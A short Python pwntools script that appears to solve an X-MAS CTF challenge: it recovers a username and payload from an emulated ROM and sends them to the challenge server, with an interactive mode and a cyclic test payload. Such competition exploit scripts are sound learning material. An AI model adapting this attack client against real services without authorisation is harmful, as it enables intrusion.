from ins import *
from emu import *
import pwn
import sys


def get_keys():
    emu = Emu.from_filename('talkative-server-redacted.rom')
    key_inss = emu.tape.data[28:68]
    key_inss.sort(key=lambda ins: ins.b)

    regs = ['o'] * 64
    max_i = 0
    for ins in key_inss:
        i = ins.b
        max_i = max(i, max_i)
        n = ins.c
        c = chr_from_serial(n)
        regs[i] = c

    # YMAS
    username = ''.join(regs[8:12])

    # I MIGHT BE BETTER THAN X-MAS LOLOLOL
    payload = ''.join(regs[14:max_i + 1])

    return (username, payload)


username, payload = get_keys()
assert (len(username) + len(payload)) >= 40

interactive = False
use_alt_payload = False
if len(sys.argv) >= 2:
    send_payload = 's' in sys.argv[1]
    interactive = 'i' in sys.argv[1]
    use_alt_payload = 'a' in sys.argv[1]

if use_alt_payload:
    payload = pwn.cyclic(len(payload), alphabet=ascii_uppercase)

io = pwn.remote('challs.xmas.htsp.ro', 5100)
pwn.context.log_level = 'debug'
if interactive:
    while True:
        s = input('> ').strip()
        io.send(serial_from_str(s))
else:
    io.send(serial_from_str(username))
    io.send(serial_from_str(payload))
    output = io.recv()
    print('"{}"'.format(str_from_serial(output)))
